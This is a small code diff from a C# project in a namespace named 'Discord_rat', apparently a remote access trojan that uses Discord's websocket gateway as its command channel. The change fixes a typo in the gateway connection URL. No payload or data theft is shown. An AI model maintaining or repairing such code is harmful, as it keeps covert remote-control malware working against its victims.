@@ -319,7 +319,7 @@ namespace Discord_rat
         public static async Task MainAsync()
         {
             client.ResponseReceived = Responsehandler;
-            await client.ConnectAsync("wss://gateway.discord.gg/?v=9&encording=json");
+            await client.ConnectAsync("wss://gateway.discord.gg/?v=9&encoding=json");
             await client.WaitUtillDead();
         }
         public static async Task heartbeat(int milliseconds)
